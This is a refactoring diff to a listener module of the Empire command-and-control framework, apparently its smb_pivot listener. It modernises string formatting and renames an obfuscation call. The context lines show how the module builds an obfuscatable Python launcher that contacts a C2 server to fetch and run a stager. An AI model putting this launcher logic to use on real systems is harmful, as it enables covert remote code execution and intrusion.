@@ -3,7 +3,6 @@ import copy
 import logging
 import os
 import random
-from builtins import object, str
 from typing import List, Optional, Tuple
 
 from empire.server.common import encryption, helpers, packets, templating
@@ -15,8 +14,8 @@ LOG_NAME_PREFIX = __name__
 log = logging.getLogger(__name__)
 
 
-class Listener(object):
-    def __init__(self, mainMenu: MainMenu, params=[]):
+class Listener:
+    def __init__(self, mainMenu: MainMenu):
         self.info = {
             "Name": "smb_pivot",
             "Authors": [
@@ -134,11 +133,7 @@ class Listener(object):
 
                 launcherBase += "import urllib.request;\n"
                 launcherBase += "UA='%s';" % (userAgent)
-                launcherBase += "server='%s';t='%s';hop='%s';" % (
-                    host,
-                    stage0,
-                    listenerName,
-                )
+                launcherBase += f"server='{host}';t='{stage0}';hop='{listenerName}';"
 
                 # prebuild the request routing packet for the launcher
                 routingPacket = packets.build_routing_packet(
@@ -165,7 +160,7 @@ class Listener(object):
                         headerKey = header.split(":")[0]
                         headerValue = header.split(":")[1]
                         # launcherBase += ",\"%s\":\"%s\"" % (headerKey, headerValue)
-                        launcherBase += 'req.add_header("%s","%s");\n' % (
+                        launcherBase += 'req.add_header("{}","{}");\n'.format(
                             headerKey,
                             headerValue,
                         )
@@ -213,7 +208,9 @@ class Listener(object):
                 launcherBase += listener_util.python_extract_stager(stagingKey)
 
                 if obfuscate:
-                    launcherBase = self.mainMenu.obfuscationv2.obfuscate(launcherBase)
+                    launcherBase = self.mainMenu.obfuscationv2.python_obfuscate(
+                        launcherBase
+                    )
                     launcherBase = self.mainMenu.obfuscationv2.obfuscate_keywords(
                         launcherBase
                     )
